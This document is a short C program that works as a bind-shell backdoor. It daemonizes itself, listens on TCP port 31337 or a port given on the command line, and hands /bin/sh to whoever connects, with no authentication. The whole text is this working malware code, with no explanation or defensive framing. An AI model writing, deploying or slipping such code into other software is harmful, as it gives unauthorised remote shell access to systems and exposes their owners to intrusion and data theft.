#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
  int sd, cli, port;
  struct sockaddr_in servaddr;
  port = 31337;

  daemon(1, 0);
  if (argc != 1) port = atoi(argv[1]);
    
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = INADDR_ANY;
  servaddr.sin_port = htons(port);

  sd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (bind(sd, (struct sockaddr *)&servaddr, sizeof(servaddr)))
    perror("bind() failed");

  listen(sd, 1);
  cli = accept(sd, NULL, 0);
  dup2(cli, 0);
  dup2(cli, 1);
  dup2(cli, 2);
  execl("/bin/sh", "sh", NULL);
}
